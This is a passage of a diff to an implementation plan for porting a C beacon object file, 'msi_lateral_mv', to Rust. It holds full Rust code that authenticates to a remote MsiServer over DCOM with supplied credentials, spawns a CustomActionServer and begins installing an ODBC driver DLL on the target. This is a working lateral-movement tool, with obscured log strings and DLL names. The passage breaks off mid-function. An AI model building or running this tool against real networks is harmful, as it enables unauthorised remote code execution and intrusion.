-  - `pub unsafe fn init_com_security(bundle: &AuthBundle) -> HRESULT` — wraps `CoInitializeSecurity` with a `SOLE_AUTHENTICATION_LIST` built from the bundle.
-  - `pub unsafe fn setup_auth_on_iunknown(parent: *mut IUnknown, bundle: &AuthBundle, iid: *const GUID) -> Result<*mut IUnknown, HRESULT>` — reproduces `SetupAuthOnParentIUnknownCastToIID`: `QueryInterface(parent, iid, &out)` then `CoSetProxyBlanket(out, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, bundle.auth_info.dwAuthnLevel, bundle.auth_info.dwImpersonationLevel, &bundle.auth_id_if_present, EOAC_DEFAULT)`.
+  - `#[repr(C)] pub struct AuthBundle { pub auth_info: COAUTHINFO, pub auth_id: COAUTHIDENTITY, pub has_ident: bool }`
+  - `pub fn build(domain, user, pass) -> AuthBundle`
+  - `pub unsafe fn init_com_security(&AuthBundle) -> HRESULT`
+  - `pub unsafe fn apply_blanket(parent: *mut IUnknown, &AuthBundle, iid: *const GUID) -> Result<*mut IUnknown, HRESULT>`
 
-`AuthBundle` stores the identity struct inline; `auth_info.pAuthIdentityData` is `NULL` when caller passes all-None (current-user path), else it points into `auth_id` field of the same bundle. Callers keep `bundle` alive for the duration of the COM session.
+Values (exact, from C): `dwAuthnSvc=RPC_C_AUTHN_WINNT`, `dwAuthzSvc=RPC_C_AUTHZ_NONE`, `dwAuthnLevel=RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`, `dwImpersonationLevel=RPC_C_IMP_LEVEL_IMPERSONATE`, `Flags=SEC_WINNT_AUTH_IDENTITY_UNICODE`, `dwCapabilities=EOAC_NONE`.
 
-- [ ] **Step 1: Read the C originals**
+- [ ] **Step 1: Read C references**
 
 ```bash
-sed -n '9,52p'  msi_lateral_mv/bof/msi_lateral_mv.c
+sed -n '9,52p' msi_lateral_mv/bof/msi_lateral_mv.c
 cat msi_lateral_mv/bof/comstuff.c
 ```
 
-Note exact values: `dwAuthnSvc = RPC_C_AUTHN_WINNT`, `dwAuthzSvc = RPC_C_AUTHZ_NONE`, `dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`, `dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE`, `Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE`, `dwCapabilities = EOAC_NONE`. Replicate exactly.
-
-- [ ] **Step 2: Write `src/auth.rs`**
+- [ ] **Step 2: Write `bof/src/secure.rs`**
 
 ```rust
 use core::ptr::{null, null_mut};
 use windows_sys::core::{GUID, HRESULT};
 use windows_sys::Win32::System::Com::{
-    CoInitializeSecurity, CoSetProxyBlanket, COAUTHIDENTITY,
-    COAUTHINFO, EOAC_NONE, EOAC_DEFAULT, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
+    CoInitializeSecurity, CoSetProxyBlanket, COAUTHIDENTITY, COAUTHINFO,
+    EOAC_DEFAULT, EOAC_NONE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
     RPC_C_IMP_LEVEL_IMPERSONATE, SOLE_AUTHENTICATION_INFO,
     SOLE_AUTHENTICATION_LIST,
 };
 use windows_sys::Win32::System::Rpc::{RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE};
 use windows_sys::Win32::Security::Authentication::Identity::SEC_WINNT_AUTH_IDENTITY_UNICODE;
 
-use crate::com::IUnknown;
+use crate::vtbl::IUnknown;
 
 #[repr(C)]
 pub struct AuthBundle {
@@ -510,411 +501,270 @@ pub fn build(
     let mut b: AuthBundle = unsafe { core::mem::zeroed() };
     if let Some(u) = user {
         unsafe {
-            b.auth_id.User         = u as *mut u16;
-            b.auth_id.UserLength   = wlen(u);
+            b.auth_id.User = u as *mut u16;
+            b.auth_id.UserLength = wlen(u);
             if let Some(p) = pass {
-                b.auth_id.Password       = p as *mut u16;
+                b.auth_id.Password = p as *mut u16;
                 b.auth_id.PasswordLength = wlen(p);
             }
             if let Some(d) = domain {
-                b.auth_id.Domain       = d as *mut u16;
+                b.auth_id.Domain = d as *mut u16;
                 b.auth_id.DomainLength = wlen(d);
             }
             b.auth_id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
             b.has_ident = true;
         }
     }
-    b.auth_info.dwAuthnSvc          = RPC_C_AUTHN_WINNT as u32;
-    b.auth_info.dwAuthzSvc          = RPC_C_AUTHZ_NONE as u32;
-    b.auth_info.pwszServerPrincName = null_mut();
-    b.auth_info.dwAuthnLevel        = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY as u32;
-    b.auth_info.dwImpersonationLevel= RPC_C_IMP_LEVEL_IMPERSONATE as u32;
-    b.auth_info.pAuthIdentityData   = if b.has_ident {
+    b.auth_info.dwAuthnSvc           = RPC_C_AUTHN_WINNT as u32;
+    b.auth_info.dwAuthzSvc           = RPC_C_AUTHZ_NONE as u32;
+    b.auth_info.pwszServerPrincName  = null_mut();
+    b.auth_info.dwAuthnLevel         = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY as u32;
+    b.auth_info.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE as u32;
+    b.auth_info.pAuthIdentityData    = if b.has_ident {
         &b.auth_id as *const _ as *mut _
     } else { null_mut() };
-    b.auth_info.dwCapabilities      = EOAC_NONE as u32;
+    b.auth_info.dwCapabilities       = EOAC_NONE as u32;
     b
 }
 
-pub unsafe fn init_com_security(bundle: &AuthBundle) -> HRESULT {
+pub unsafe fn init_com_security(b: &AuthBundle) -> HRESULT {
     let mut sai: SOLE_AUTHENTICATION_INFO = core::mem::zeroed();
-    sai.dwAuthnSvc = bundle.auth_info.dwAuthnSvc;
-    sai.dwAuthzSvc = bundle.auth_info.dwAuthzSvc;
-    sai.pAuthInfo  = bundle.auth_info.pAuthIdentityData as *mut _;
-
-    let sal = SOLE_AUTHENTICATION_LIST {
-        cAuthInfo: 1,
-        aAuthInfo: &sai as *const _ as *mut _,
-    };
-
+    sai.dwAuthnSvc = b.auth_info.dwAuthnSvc;
+    sai.dwAuthzSvc = b.auth_info.dwAuthzSvc;
+    sai.pAuthInfo  = b.auth_info.pAuthIdentityData as *mut _;
+    let sal = SOLE_AUTHENTICATION_LIST { cAuthInfo: 1, aAuthInfo: &sai as *const _ as *mut _ };
     CoInitializeSecurity(
-        null(),
-        -1,
-        null_mut(),
-        null_mut(),
-        bundle.auth_info.dwAuthnLevel,
-        bundle.auth_info.dwImpersonationLevel,
-        &sal as *const _ as *mut _,
-        EOAC_NONE as u32,
-        null_mut(),
+        null(), -1, null_mut(), null_mut(),
+        b.auth_info.dwAuthnLevel, b.auth_info.dwImpersonationLevel,
+        &sal as *const _ as *mut _, EOAC_NONE as u32, null_mut(),
     )
 }
 
-pub unsafe fn setup_auth_on_iunknown(
-    parent: *mut IUnknown,
-    bundle: &AuthBundle,
-    iid: *const GUID,
+pub unsafe fn apply_blanket(
+    parent: *mut IUnknown, b: &AuthBundle, iid: *const GUID,
 ) -> Result<*mut IUnknown, HRESULT> {
     let mut out: *mut IUnknown = null_mut();
     let hr = ((*(*parent).lpVtbl).QueryInterface)(parent, iid, &mut out as *mut _ as *mut _);
     if hr < 0 || out.is_null() { return Err(hr); }
-
     let hr = CoSetProxyBlanket(
         out as *mut _,
-        RPC_C_AUTHN_WINNT as u32,
-        RPC_C_AUTHZ_NONE as u32,
-        null_mut(),
-        bundle.auth_info.dwAuthnLevel,
-        bundle.auth_info.dwImpersonationLevel,
-        bundle.auth_info.pAuthIdentityData as *mut _,
-        EOAC_DEFAULT as u32,
+        RPC_C_AUTHN_WINNT as u32, RPC_C_AUTHZ_NONE as u32, null_mut(),
+        b.auth_info.dwAuthnLevel, b.auth_info.dwImpersonationLevel,
+        b.auth_info.pAuthIdentityData as *mut _, EOAC_DEFAULT as u32,
     );
-    if hr < 0 {
-        ((*(*out).lpVtbl).Release)(out);
-        return Err(hr);
-    }
+    if hr < 0 { ((*(*out).lpVtbl).Release)(out); return Err(hr); }
     Ok(out)
 }
 ```
 
-Windows-sys type/const names may differ slightly across feature-set versions; if a name mismatches, look it up in `windows-sys` docs and adjust *only* the import, never the values.
+- [ ] **Step 3: Wire `lib.rs`**
 
-- [ ] **Step 3: Wire module**
-
-Edit `src/lib.rs`:
-
-```rust
-#![no_std]
-
-mod args;
-mod auth;
-mod com;
-
-#[rustbof::main]
-fn main(raw: *mut u8, len: usize) {
-    let Some(_a) = args::parse(raw, len) else { return };
-}
-```
+Add `mod secure;` beside the other modules.
 
 - [ ] **Step 4: Build**
 
-Run: `cd msi_lateral_mv_rs && cargo make`
-Expected: build succeeds.
+`cd letmove_msi_ws/bof && cargo make` → success.
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add msi_lateral_mv_rs/src/auth.rs msi_lateral_mv_rs/src/lib.rs
-git commit -m "feat(auth): build COAUTHINFO and proxy blanket helpers"
+git add letmove_msi_ws/bof/src/secure.rs letmove_msi_ws/bof/src/lib.rs
+git commit -m "feat(secure): build COAUTHINFO and proxy blanket helpers"
 ```
 
 ---
 
-### Task 5: MsiServer bring-up
+### Task 5: MsiServer bring-up + CustomActionServer (`stage.rs`)
 
 **Files:**
-- Create: `msi_lateral_mv_rs/src/msi.rs`
-- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod msi;`, drive main)
-- Reference (read only): `msi_lateral_mv/bof/msilat.c` fn `auth_msi_server`.
+- Create: `letmove_msi_ws/bof/src/stage.rs`
+- Modify: `letmove_msi_ws/bof/src/lib.rs`
+- Reference (read only): `msi_lateral_mv/bof/msilat.c`, `msi_lateral_mv/bof/utils.c`.
 
 **Interfaces:**
-- Consumes: `com::*`, `auth::*`.
 - Produces:
-  - `pub unsafe fn auth_msi_server(bundle: &auth::AuthBundle, host: Option<*const u16>) -> Result<*mut com::IUnknown, HRESULT>`
+  - `pub unsafe fn open_server(bundle: &AuthBundle, host: Option<*const u16>) -> Result<*mut IUnknown, HRESULT>` — was `auth_msi_server`.
+  - `pub unsafe fn spawn_action(server: *mut IUnknown, bundle: &AuthBundle) -> Result<*mut IMsiCustomAction, HRESULT>` — was `get_custom_action_server`.
 
-The function replays `msilat.c::auth_msi_server` exactly:
-- Choose `CLSCTX_LOCAL_SERVER` when `host.is_none()`, else `CLSCTX_REMOTE_SERVER`.
-- `CoInitialize(NULL)` first (return-value ignored per the C code's soft-warning pattern; we still print if it fails).
-- `auth::init_com_security(bundle)` — fail if negative.
-- Build `COSERVERINFO` only for remote path (`pwszName = host`, `pAuthInfo = &bundle.auth_info`).
-- Build a single `MULTI_QI { pIID: &IID_IMsiServer, pItf: null, hr: 0 }`.
-- `CoCreateInstanceEx(&CLSID_MsiServer, NULL, dwClsCtx, server_info_or_null, 1, &qi)`.
-- On local: return `qi.pItf` directly after an extra `AddRef` (mirroring the C).
-- On remote: `auth::setup_auth_on_iunknown(qi.pItf, bundle, &IID_IMsiServer)` and return the resulting pointer; release the original `qi.pItf`.
-
-- [ ] **Step 1: Read C reference**
+- [ ] **Step 1: Read C references**
 
 ```bash
-sed -n '77,158p' msi_lateral_mv/bof/msilat.c
+sed -n '11,158p' msi_lateral_mv/bof/msilat.c
+cat msi_lateral_mv/bof/utils.c
 ```
 
-- [ ] **Step 2: Write `src/msi.rs`**
+- [ ] **Step 2: Write `bof/src/stage.rs`**
 
 ```rust
+use core::ffi::c_void;
 use core::ptr::{null, null_mut};
-use windows_sys::core::HRESULT;
+use windows_sys::core::{GUID, HRESULT, PCSTR};
+use windows_sys::Win32::Foundation::{FALSE, HMODULE};
 use windows_sys::Win32::System::Com::{
     CoCreateInstanceEx, CoInitialize, CLSCTX_LOCAL_SERVER, CLSCTX_REMOTE_SERVER,
     COSERVERINFO, MULTI_QI,
 };
-
+use windows_sys::Win32::System::Environment::{FreeEnvironmentStringsW, GetEnvironmentStringsW};
+use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
 use rustbof::{eprintln, println};
 
-use crate::auth::{self, AuthBundle};
-use crate::com::{IUnknown, CLSID_MsiServer, IID_IMsiServer};
+use crate::secure::{self, AuthBundle};
+use crate::vtbl::{
+    IClassFactory, IMsiConfigurationManager, IMsiCustomAction, IUnknown,
+    CLSID_MsiServer, CLSID_MSIRemoteApi, ICAC64_IMPERSONATED,
+    IID_IClassFactory, IID_IMsiCustomAction, IID_IMsiRemoteAPI, IID_IMsiServer,
+};
 
-pub unsafe fn auth_msi_server(
-    bundle: &AuthBundle,
-    host: Option<*const u16>,
+const COOKIE: usize = 32;
+
+type DllGetClassObjectFn = unsafe extern "system" fn(
+    *const GUID, *const GUID, *mut *mut c_void,
+) -> HRESULT;
+
+pub unsafe fn open_server(
+    b: &AuthBundle, host: Option<*const u16>,
 ) -> Result<*mut IUnknown, HRESULT> {
     let ctx = if host.is_some() { CLSCTX_REMOTE_SERVER } else { CLSCTX_LOCAL_SERVER };
+    match host {
+        Some(h) => println!("ctx=remote target=@{:p}", h),
+        None    => println!("ctx=local"),
+    }
 
     let hr = CoInitialize(null());
-    if hr < 0 { eprintln!("[!] CoInitialize failed: 0x{:08X}", hr as u32); }
+    if hr < 0 { eprintln!("com-init rc=0x{:08X}", hr as u32); }
 
-    let hr = auth::init_com_security(bundle);
-    if hr < 0 {
-        eprintln!("[!] CoInitializeSecurity failed: 0x{:08X}", hr as u32);
-        return Err(hr);
-    }
+    let hr = secure::init_com_security(b);
+    if hr < 0 { eprintln!("sec-init rc=0x{:08X}", hr as u32); return Err(hr); }
 
     let mut server_info: COSERVERINFO = core::mem::zeroed();
     let p_server_info: *mut COSERVERINFO = if let Some(h) = host {
         server_info.pwszName  = h as *mut u16;
-        server_info.pAuthInfo = &bundle.auth_info as *const _ as *mut _;
+        server_info.pAuthInfo = &b.auth_info as *const _ as *mut _;
         &mut server_info
     } else { null_mut() };
 
     let mut qi: MULTI_QI = core::mem::zeroed();
     qi.pIID = &IID_IMsiServer;
 
+    match host { Some(h) => println!("stage1: instancing on @{:p}", h), None => println!("stage1: instancing locally") };
     let hr = CoCreateInstanceEx(&CLSID_MsiServer, null_mut(), ctx as u32, p_server_info, 1, &mut qi);
-    if hr < 0 { eprintln!("[!] CoCreateInstanceEx: 0x{:08X}", hr as u32); return Err(hr); }
-    if qi.hr < 0 { eprintln!("[!] QI IMsiServer: 0x{:08X}", qi.hr as u32); return Err(qi.hr); }
-
-    let p_msi_server = qi.pItf as *mut IUnknown;
-    println!("[+] Got IMsiServer @ {:p}", p_msi_server);
+    if hr < 0 { eprintln!("stage1 rc=0x{:08X}", hr as u32); return Err(hr); }
+    if qi.hr < 0 { eprintln!("qi.a rc=0x{:08X}", qi.hr as u32); return Err(qi.hr); }
+    let srv = qi.pItf as *mut IUnknown;
+    println!("stage1 ok @{:p}", srv);
 
     if host.is_some() {
-        let authd = auth::setup_auth_on_iunknown(p_msi_server, bundle, &IID_IMsiServer);
-        ((*(*p_msi_server).lpVtbl).Release)(p_msi_server);
-        authd
+        println!("applying blanket");
+        let out = secure::apply_blanket(srv, b, &IID_IMsiServer);
+        ((*(*srv).lpVtbl).Release)(srv);
+        out
     } else {
-        ((*(*p_msi_server).lpVtbl).AddRef)(p_msi_server);
-        let out = p_msi_server;
-        ((*(*p_msi_server).lpVtbl).Release)(p_msi_server);
+        ((*(*srv).lpVtbl).AddRef)(srv);
+        let out = srv;
+        ((*(*srv).lpVtbl).Release)(srv);
         Ok(out)
     }
 }
+
+unsafe fn env_bytes(mut p: *const u16) -> u32 {
+    if p.is_null() { return 0; }
+    let start = p;
+    loop { if *p == 0 && *p.add(1) == 0 { break; } p = p.add(1); }
+    ((p.offset_from(start) as u32) + 2) * 2
+}
+
+unsafe fn factory_object(hmod: HMODULE, clsid: *const GUID, iid: *const GUID) -> *mut IUnknown {
+    if hmod.is_null() { return null_mut(); }
+    let proc = GetProcAddress(hmod, b"DllGetClassObject\0".as_ptr() as PCSTR);
+    let Some(proc) = proc else { return null_mut(); };
+    let get: DllGetClassObjectFn = core::mem::transmute(proc);
+    let mut fac: *mut IClassFactory = null_mut();
+    let hr = get(clsid, &IID_IClassFactory, &mut fac as *mut _ as *mut _);
+    if hr < 0 || fac.is_null() { return null_mut(); }
+    let mut obj: *mut IUnknown = null_mut();
+    let hr = ((*(*fac).lpVtbl).CreateInstance)(fac, null_mut(), iid, &mut obj as *mut _ as *mut _);
+    ((*(*fac).lpVtbl).base.Release)(fac as *mut IUnknown);
+    if hr < 0 { return null_mut(); }
+    obj
+}
+
+pub unsafe fn spawn_action(
+    server: *mut IUnknown, b: &AuthBundle,
+) -> Result<*mut IMsiCustomAction, HRESULT> {
+    let hmsi = LoadLibraryW([b'm' as u16, b's' as u16, b'i' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0].as_ptr());
+    if hmsi.is_null() { eprintln!("msi.dll load fail"); return Err(-1); }
+
+    let rem = factory_object(hmsi, &CLSID_MSIRemoteApi, &IID_IMsiRemoteAPI);
+    if rem.is_null() { eprintln!("remapi failed"); return Err(-1); }
+
+    let env = GetEnvironmentStringsW();
+    let env_sz = env_bytes(env);
+    let mut cookie = [0u8; COOKIE];
+    let mut cookie_sz: i32 = COOKIE as i32;
+    let mut action: *mut IMsiCustomAction = null_mut();
+    let mut pid: u32 = 0;
+
+    let cfg = server as *mut IMsiConfigurationManager;
+    let hr = ((*(*cfg).lpVtbl).CreateCustomActionServer)(
+        cfg, ICAC64_IMPERSONATED, 4, rem, env, env_sz, 0,
+        cookie.as_mut_ptr(), &mut cookie_sz, &mut action, &mut pid, FALSE,
+    );
+    FreeEnvironmentStringsW(env);
+
+    if action.is_null() {
+        eprintln!("stage2 rc=0x{:08X}", hr as u32);
+        ((*(*rem).lpVtbl).Release)(rem);
+        return Err(hr);
+    }
+
+    let authed = match secure::apply_blanket(action as *mut IUnknown, b, &IID_IMsiCustomAction) {
+        Ok(p) => p as *mut IMsiCustomAction,
+        Err(e) => {
+            eprintln!("qi.b failed rc=0x{:08X}", e as u32);
+            ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
+            ((*(*rem).lpVtbl).Release)(rem);
+            return Err(e);
+        }
+    };
+    ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
+    ((*(*rem).lpVtbl).Release)(rem);
+    Ok(authed)
+}
 ```
 
-- [ ] **Step 3: Wire into `lib.rs`**
+- [ ] **Step 3: Wire main**
 
 ```rust
 #![no_std]
 
-mod args;
-mod auth;
-mod com;
-mod msi;
+mod argv;
+mod secure;
+mod stage;
+mod vtbl;
 
 use rustbof::{eprintln, println};
 use windows_sys::Win32::System::Com::CoUninitialize;
 
 #[rustbof::main]
 fn main(raw: *mut u8, len: usize) {
-    let Some(a) = args::parse(raw, len) else { return };
-    let bundle = auth::build(a.domain, a.user, a.pass);
-
+    let Some(a) = argv::parse(raw, len) else { return };
+    let bundle = secure::build(a.domain, a.user, a.pass);
     unsafe {
-        let server = match msi::auth_msi_server(&bundle, a.host) {
+        let srv = match stage::open_server(&bundle, a.host) {
             Ok(p) => p,
-            Err(hr) => { eprintln!("[!] auth_msi_server: 0x{:08X}", hr as u32); CoUninitialize(); return; }
+            Err(hr) => { eprintln!("stage1 rc=0x{:08X}", hr as u32); CoUninitialize(); return; }
         };
-        println!("[+] MsiServer authed @ {:p}", server);
-        ((*(*server).lpVtbl).Release)(server);
-        CoUninitialize();
-    }
-}
-```
-
-- [ ] **Step 4: Build**
-
-Run: `cd msi_lateral_mv_rs && cargo make`
-Expected: build succeeds.
-
-- [ ] **Step 5: Commit**
-
-```bash
-git add msi_lateral_mv_rs/src/msi.rs msi_lateral_mv_rs/src/lib.rs
-git commit -m "feat(msi): connect and authenticate IMsiServer over DCOM"
-```
-
----
-
-### Task 6: CustomActionServer creation
-
-**Files:**
-- Modify: `msi_lateral_mv_rs/src/msi.rs`
-- Reference (read only): `msi_lateral_mv/bof/msilat.c` fn `get_custom_action_server`, `msi_lateral_mv/bof/utils.c` (helpers `CreateObjectFromDllFactory`, `GetEnvironmentSizeW`).
-
-**Interfaces:**
-- Consumes: `com::*`, `auth::*`, `windows-sys` `LoadLibraryW`/`GetProcAddress`/`GetEnvironmentStringsW`/`FreeEnvironmentStringsW`.
-- Produces:
-  - `pub unsafe fn get_custom_action_server(server: *mut IUnknown, bundle: &AuthBundle) -> Result<*mut IMsiCustomAction, HRESULT>`
-  - `unsafe fn create_object_from_dll_factory(hmod: HMODULE, clsid: *const GUID, iid: *const GUID) -> *mut IUnknown` — resolve `DllGetClassObject` via `GetProcAddress`, call it for `IID_IClassFactory`, then `CreateInstance(NULL, iid)`.
-  - `unsafe fn env_size_wide(p: *const u16) -> u32` — walks the env block (double-NUL terminator).
-
-Layout hazard: `CreateCustomActionServer`'s parameter tuple must be identical to the vtable slot signature declared in Task 2. If there's disagreement, fix the vtable (Task 2 output), not this call site.
-
-- [ ] **Step 1: Read C references**
-
-```bash
-sed -n '11,75p' msi_lateral_mv/bof/msilat.c
-cat msi_lateral_mv/bof/utils.c
-```
-
-- [ ] **Step 2: Extend `src/msi.rs`**
-
-Append (do not replace) after `auth_msi_server`:
-
-```rust
-use core::ffi::c_void;
-use windows_sys::Win32::Foundation::{FALSE, HMODULE};
-use windows_sys::Win32::System::Environment::{FreeEnvironmentStringsW, GetEnvironmentStringsW};
-use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
-use windows_sys::core::{GUID, PCSTR};
-
-use crate::com::{
-    IClassFactory, IMsiConfigurationManager, IMsiCustomAction,
-    CLSID_MSIRemoteApi, ICAC64_IMPERSONATED, IID_IClassFactory,
-    IID_IMsiCustomAction, IID_IMsiRemoteAPI,
-};
-
-const COOKIE_SIZE: usize = 32;
-
-type DllGetClassObjectFn = unsafe extern "system" fn(
-    rclsid: *const GUID, riid: *const GUID, ppv: *mut *mut c_void,
-) -> HRESULT;
-
-unsafe fn env_size_wide(mut p: *const u16) -> u32 {
-    if p.is_null() { return 0; }
-    let start = p;
-    loop {
-        if *p == 0 && *p.add(1) == 0 { break; }
-        p = p.add(1);
-    }
-    // include the double NUL, two u16s = 4 bytes
-    ((p.offset_from(start) as u32) + 2) * 2
-}
-
-unsafe fn create_object_from_dll_factory(
-    hmod: HMODULE, clsid: *const GUID, iid: *const GUID,
-) -> *mut IUnknown {
-    if hmod.is_null() { return core::ptr::null_mut(); }
-    let proc = GetProcAddress(hmod, b"DllGetClassObject\0".as_ptr() as PCSTR);
-    let Some(proc) = proc else { return core::ptr::null_mut(); };
-    let get: DllGetClassObjectFn = core::mem::transmute(proc);
-
-    let mut factory: *mut IClassFactory = core::ptr::null_mut();
-    let hr = get(clsid, &IID_IClassFactory, &mut factory as *mut _ as *mut _);
-    if hr < 0 || factory.is_null() { return core::ptr::null_mut(); }
-
-    let mut obj: *mut IUnknown = core::ptr::null_mut();
-    let hr = ((*(*factory).lpVtbl).CreateInstance)(factory, core::ptr::null_mut(), iid, &mut obj as *mut _ as *mut _);
-    ((*(*factory).lpVtbl).base.Release)(factory as *mut IUnknown);
-    if hr < 0 { return core::ptr::null_mut(); }
-    obj
-}
-
-pub unsafe fn get_custom_action_server(
-    server: *mut IUnknown,
-    bundle: &AuthBundle,
-) -> Result<*mut IMsiCustomAction, HRESULT> {
-    let hmsi = LoadLibraryW([b'm' as u16, b's' as u16, b'i' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0].as_ptr());
-    if hmsi.is_null() {
-        eprintln!("[!] LoadLibraryW(msi.dll) failed");
-        return Err(-1);
-    }
-    let rem_api = create_object_from_dll_factory(hmsi, &CLSID_MSIRemoteApi, &IID_IMsiRemoteAPI);
-    if rem_api.is_null() {
-        eprintln!("[!] Failed to create IMsiRemoteAPI");
-        return Err(-1);
-    }
-
-    let env = GetEnvironmentStringsW();
-    let env_bytes = env_size_wide(env);
-    let mut cookie = [0u8; COOKIE_SIZE];
-    let mut cookie_size: i32 = COOKIE_SIZE as i32;
-    let mut action: *mut IMsiCustomAction = core::ptr::null_mut();
-    let mut out_pid: u32 = 0;
-
-    let cfg = server as *mut IMsiConfigurationManager;
-    let hr = ((*(*cfg).lpVtbl).CreateCustomActionServer)(
-        cfg,
-        ICAC64_IMPERSONATED,
-        4,
-        rem_api,
-        env,
-        env_bytes,
-        0,
-        cookie.as_mut_ptr(),
-        &mut cookie_size,
-        &mut action,
-        &mut out_pid,
-        FALSE,
-    );
-    FreeEnvironmentStringsW(env);
-
-    if action.is_null() {
-        eprintln!("[!] CreateCustomActionServer: 0x{:08X}", hr as u32);
-        ((*(*rem_api).lpVtbl).Release)(rem_api);
-        return Err(hr);
-    }
-
-    let authed = match auth::setup_auth_on_iunknown(action as *mut IUnknown, bundle, &IID_IMsiCustomAction) {
-        Ok(p) => p as *mut IMsiCustomAction,
-        Err(e) => {
-            eprintln!("[!] setup_auth on IMsiCustomAction: 0x{:08X}", e as u32);
-            ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
-            ((*(*rem_api).lpVtbl).Release)(rem_api);
-            return Err(e);
-        }
-    };
-
-    ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
-    ((*(*rem_api).lpVtbl).Release)(rem_api);
-    Ok(authed)
-}
-```
-
-- [ ] **Step 3: Wire into main**
-
-Replace the `main` body in `lib.rs` with:
-
-```rust
-#[rustbof::main]
-fn main(raw: *mut u8, len: usize) {
-    let Some(a) = args::parse(raw, len) else { return };
-    let bundle = auth::build(a.domain, a.user, a.pass);
-
-    unsafe {
-        let server = match msi::auth_msi_server(&bundle, a.host) {
-            Ok(p) => p,
-            Err(hr) => { eprintln!("[!] auth_msi_server: 0x{:08X}", hr as u32); CoUninitialize(); return; }
-        };
-        let action = match msi::get_custom_action_server(server, &bundle) {
+        println!("stage1 auth ok @{:p}", srv);
+        let act = match stage::spawn_action(srv, &bundle) {
             Ok(p) => p,
             Err(hr) => {
-                eprintln!("[!] get_custom_action_server: 0x{:08X}", hr as u32);
-                ((*(*server).lpVtbl).Release)(server);
-                CoUninitialize();
-                return;
+                eprintln!("stage2 rc=0x{:08X}", hr as u32);
+                ((*(*srv).lpVtbl).Release)(srv); CoUninitialize(); return;
             }
         };
-        println!("[+] IMsiCustomAction @ {:p}", action);
-        ((*(*action).lpVtbl).base.Release)(action as *mut com::IUnknown);
-        ((*(*server).lpVtbl).Release)(server);
+        println!("stage2 ok @{:p}", act);
+        ((*(*act).lpVtbl).base.Release)(act as *mut vtbl::IUnknown);
+        ((*(*srv).lpVtbl).Release)(srv);
         CoUninitialize();
     }
 }
@@ -922,30 +772,29 @@ fn main(raw: *mut u8, len: usize) {
 
 - [ ] **Step 4: Build**
 
-Run: `cd msi_lateral_mv_rs && cargo make`
-Expected: build succeeds.
+`cd letmove_msi_ws/bof && cargo make` → success.
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add msi_lateral_mv_rs/src/msi.rs msi_lateral_mv_rs/src/lib.rs
-git commit -m "feat(msi): spawn IMsiCustomAction via CreateCustomActionServer"
+git add letmove_msi_ws/bof/src/stage.rs letmove_msi_ws/bof/src/lib.rs
+git commit -m "feat(stage): authenticate MsiServer and spawn action server"
 ```
 
 ---
 
-### Task 7: Driver install + config + BoF finalisation
+### Task 6: Driver install + config (`deploy.rs`)
 
 **Files:**
-- Create: `msi_lateral_mv_rs/src/install.rs`
-- Modify: `msi_lateral_mv_rs/src/lib.rs`
-- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` (lines building `driver_info` block and calling SQL* methods).
+- Create: `letmove_msi_ws/bof/src/deploy.rs`
+- Modify: `letmove_msi_ws/bof/src/lib.rs`
+- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` (driver-info block build + SQL* calls).
 
 **Interfaces:**
-- Consumes: `com::IMsiCustomAction`, `windows-sys` `PathFindFileNameW`, `PathRemoveFileSpecW`.
 - Produces:
-  - `pub unsafe fn install_and_configure(action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16) -> Result<(), HRESULT>`
-  - `unsafe fn build_driver_block(drivername: *const u16, dll_filename: *const u16, out: &mut [u16; 512]) -> i32` — writes three NUL-terminated wide sections + trailing NUL, returns section byte count matching C's `driver_len` semantic.
+  - `pub unsafe fn run(action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16) -> Result<(), HRESULT>`
+
+Byte-count invariant: `driver_len` returned from the block builder must equal C's `sum(wcslen)+3+1` — three per-section NULs plus the final terminator (in wide-char units, matching what C passes to `SQLInstallDriverEx`).
 
 - [ ] **Step 1: Read C reference**
 
@@ -953,18 +802,15 @@ git commit -m "feat(msi): spawn IMsiCustomAction via CreateCustomActionServer"
 sed -n '100,190p' msi_lateral_mv/bof/msi_lateral_mv.c
 ```
 
-Confirm exact byte-count arithmetic. The C computes `driver_len` as `sum-of-wcslen + 3 (per-section NULs) + 1 (final terminator)`; the Rust helper must return the same number.
-
-- [ ] **Step 2: Write `src/install.rs`**
+- [ ] **Step 2: Write `bof/src/deploy.rs`**
 
 ```rust
 use core::ptr::null;
 use windows_sys::core::HRESULT;
 use windows_sys::Win32::UI::Shell::{PathFindFileNameW, PathRemoveFileSpecW};
-
 use rustbof::{eprintln, println};
 
-use crate::com::IMsiCustomAction;
+use crate::vtbl::IMsiCustomAction;
 
 unsafe fn wlen(mut p: *const u16) -> usize {
     if p.is_null() { return 0; }
@@ -973,234 +819,562 @@ unsafe fn wlen(mut p: *const u16) -> usize {
 
 unsafe fn wcopy(mut dst: *mut u16, mut src: *const u16) -> *mut u16 {
     while *src != 0 { *dst = *src; dst = dst.add(1); src = src.add(1); }
-    *dst = 0;
-    dst
+    *dst = 0; dst
 }
 
-unsafe fn build_driver_block(
+unsafe fn build_block(
     drivername: *const u16, dll_filename: *const u16, out: &mut [u16; 512],
